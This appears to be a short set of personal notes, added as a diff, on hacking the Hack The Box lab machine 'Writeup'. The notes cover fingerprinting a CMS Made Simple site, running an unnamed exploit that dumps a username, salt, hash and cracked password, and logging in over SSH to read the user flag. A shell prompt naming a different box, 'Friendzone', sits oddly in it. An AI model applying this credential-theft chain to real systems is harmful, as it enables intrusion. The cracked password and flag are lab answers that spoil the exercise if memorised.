@@ -1,0 +1,40 @@
+Analyse :80/writeup with Wappalyzer
+
+site is running 
+CMS Made Simple
+PHP Programming Languages
+Apache 2.4.25 Web Servers
+Debian Operating Systems
+
+
+Found dir with basic auth
+
+/writeup/admin
+
+
+Run exploit
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+[+] Password cracked: raykayjay9
+
+
+oot@kali:~/HTB/Friendzone# ssh jkr@writeup.htb
+jkr@writeup.htb's password: 
+Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Jun 10 10:10:43 2019 from 10.10.14.145
+jkr@writeup:~$ ls -a
+.   .bash_history  .bashrc     mess.txt  .profile  .ssh
+..  .bash_logout   linenum.sh  .nano     pspy64    user.txt
+jkr@writeup:~$ cat user.txt
+d4e493fd4068afc9eb1aa6a55319f978
+jkr@writeup:~$ 
+
